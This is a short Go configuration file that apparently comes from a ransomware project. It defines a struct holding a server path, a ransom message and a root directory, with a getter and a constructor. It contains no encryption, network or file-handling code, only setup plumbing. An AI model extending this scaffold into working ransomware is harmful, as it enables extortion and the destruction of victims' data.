package config

type Config struct {
	ServerPath    string
	RansomMessage string
	RootDirectory string
}

var conf *Config

// GetConfig returns a pointer the the local configuration
func GetConfig() *Config {
	return conf
}

// CreateConfiguration sets the config using different fields
func CreateConfiguration(sPath, rDir, rMessage string) {
	conf = &Config{
		RansomMessage: rMessage,
		RootDirectory: rDir,
		ServerPath:    sPath,
	}
}
